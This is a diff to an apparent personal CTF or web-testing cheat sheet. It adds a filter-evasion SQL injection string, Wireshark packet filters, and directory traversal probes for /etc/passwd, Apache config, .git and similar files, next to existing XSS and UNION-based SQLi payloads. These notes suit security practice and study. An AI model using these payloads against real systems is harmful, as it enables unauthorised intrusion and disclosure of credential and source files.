@@ -65,16 +65,35 @@ background-color:#f00;background:url("javascript:alert(document.domain);");
 ' or 1=1 union select password, name, 1 from users_hogefuga;--
 SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members 
 
+hoge
+fuga' OORR '1
+
 https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
 
 # Wire shark packete filter
 icmp.type == 8
 http.host contains google
+tcp.flags == 0x02
+tcp.flags == 0x12
+tcp.flags == 0x14
+http.response
+http.request
+
+udp contains 33:27:58
 * パケットサイズ
 frame.len == 18
 data.data
 frame contains 17
+(tcp.flags.reset == 1) && (ip.id > 0)
 
 # directory traversal
 view.php?file=../index.php
 ?lang=php://filter/convert.base64-encode/resource=index.php
+../index
+../index.php
+/etc/passwd
+../../../etc/passwd
+/etc/apache2/httpd.conf
+.git
+sitemap.xml
+robots.txt
